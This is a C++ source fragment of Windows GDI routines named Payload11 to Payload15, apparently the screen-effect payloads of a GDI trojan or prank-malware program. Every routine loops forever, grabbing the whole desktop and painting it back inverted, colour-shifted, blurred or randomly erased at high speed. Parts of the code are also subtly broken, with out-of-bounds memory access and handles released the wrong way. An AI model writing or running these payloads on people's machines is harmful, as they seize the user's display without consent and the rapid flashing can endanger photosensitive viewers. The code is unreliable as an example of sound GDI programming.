DWORD WINAPI Payload11_num1(LPVOID lpParam) {
    int t = 0;
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD prgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int randomrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        for (int i = 0; i < w * h; i++) {
            int r = GetRValue(prgbScreen[i].rgb) % 255, g = GetGValue(prgbScreen[i].rgb) % 255, b = GetBValue(prgbScreen[i].rgb) % 255;
            prgbScreen[i].rgb = (RGB((2 * r) % 114, (g + t) % 222, (b + i) % 314) + int(sqrt(i >> t / (r + 11))) / 4) % randomrgb;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        t++;
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload12_num1(LPVOID lpParam) {
    RGBQUAD rgbquadCopy; int i = 0;
    while (true) {
        HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * sqrt(x * i | y * i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload12_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        for (int y = 0; y < h; y += 5) {
            HDC hdc = GetDC(0);
            StretchBlt(hdc, 0, 0, w, y, hdc, 0, 0, w, y, NOTSRCCOPY);
            ReleaseDC(0, hdc);
            DeleteDC(hdc);
            Sleep(1);
        }
    }
    return 0;
}

DWORD WINAPI Payload12_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        for (int x = 0; x < w; x += 5) {
            HDC hdc = GetDC(0);
            StretchBlt(hdc, 0, 0, x, h, hdc, 0, 0, x, h, NOTSRCCOPY);
            ReleaseDC(0, hdc);
            DeleteDC(hdc);
            Sleep(1);
        }
    }
    return 0;
}

DWORD WINAPI Payload12_num4(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 20, 0 };
    int count = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, -5, -5, w, h, hcdc, 0, 0, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        if (count == 10) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    }
    return 0;
}

DWORD WINAPI Payload13_num1(LPVOID lpParam) {
    int size = 400; BLENDFUNCTION blend = { AC_SRC_OVER, 0, 40, 0 };
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 15; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, NOTSRCERASE);
        }
        for (int i = 0; i < 15; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCERASE);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload13_num2(LPVOID lpParam) {
    double angle = 0;
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, NOTSRCERASE);
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, NOTSRCCOPY);
            angle += 3.1415926 / 600;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI Payload14_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb *= i % w | i / h;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload15_num1(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int x = 0; x < w; x++) {
            StretchBlt(hcdc, x, 0, 1, h, hcdc, x - 1, 0, 1, h, NOTSRCERASE);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload15_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            int v = rand() % 520;
            ((BYTE*)(data + i))[v] *= ((BYTE*)(data + i + v))[v] & byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}